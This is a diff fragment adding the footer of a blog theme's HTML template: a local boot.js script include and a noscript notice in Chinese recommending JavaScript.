+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
